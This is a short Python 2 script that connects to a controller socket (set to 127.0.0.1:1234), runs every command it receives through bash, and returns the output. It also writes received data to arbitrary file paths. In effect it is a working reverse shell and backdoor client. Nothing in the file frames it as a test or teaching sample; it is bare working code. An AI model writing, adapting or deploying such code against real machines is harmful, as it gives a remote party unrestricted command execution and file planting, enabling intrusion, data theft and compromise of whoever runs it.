#1/usr/bin/python
from socket import socket, AF_INET, SOCK_STREAM,error
from subprocess import Popen, PIPE
from time import sleep
from sys import exit as exitapp
from platform import dist as ostype

buffer_size = 4096
host = '127.0.0.1'
port = 1234
max_timeout = 10
sock = socket(AF_INET , SOCK_STREAM)
sock.settimeout(max_timeout)

try:
    sock.connect((host, port))
except error as msg:
    print "Socket Error: %s" % msg
while True:
    try:
        data = sock.recv(buffer_size)
        if data == "F":
            des=sock.recv(4096)
            f=open(des,'wb')
            while True:
                try:
                    data = sock.recv(1024)
                    if data=="E":
                        f.close()
                        break
                    f.write(data)
                except:
                    f.close()
                    break
        else:
            if "package" in data:
                if ostype()[0] == "centos":
                    data = data.replace("package", "yum")
                elif ostype()[0] == "debian":
                    data = data.replace("package", "apt-get")
            proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE,executable="/bin/bash")
            out, err = proc.communicate()
            if err:
                sock.send(err)
            elif out and not err:
                sock.send(out)
            elif out == "" and not err:
                sock.send("empty return...")
    except Exception as e:
        continue
sock.close()
